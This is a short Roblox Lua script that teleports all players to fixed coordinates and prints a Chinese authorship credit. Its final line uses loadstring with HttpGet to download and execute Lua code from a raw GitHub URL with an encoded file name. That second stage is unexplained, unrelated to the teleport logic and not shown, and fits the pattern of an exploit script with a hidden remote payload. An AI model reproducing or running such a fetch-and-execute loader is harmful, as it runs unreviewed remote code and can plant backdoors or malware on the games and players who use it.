local Players = game:GetService("Players")

local function teleportPlayer(player)
    local targetPosition = Vector3.new(362.34674072265625, 15.283108711242676, -1132.4732666015625)
    local character = player.Character
    if character then
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.CFrame = CFrame.new(targetPosition)
            print(player.Name .. "该脚本由宇神制作")
        else
            warn("找不到 HumanoidRootPart")
        end
    else
        warn("玩家角色不存在")
    end
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        wait(2)
        teleportPlayer(player)
    end)
end)

for _, player in ipairs(Players:GetPlayers()) do
    if player.Character then
        teleportPlayer(player)
    end
end

wait(0.1)

loadstring(game:HttpGet("https://raw.githubusercontent.com/qwrt5589/eododo/63472a195733ce16bc61ea5aa9619d6ae4f2a13a/%25%2B19191919.lua"))()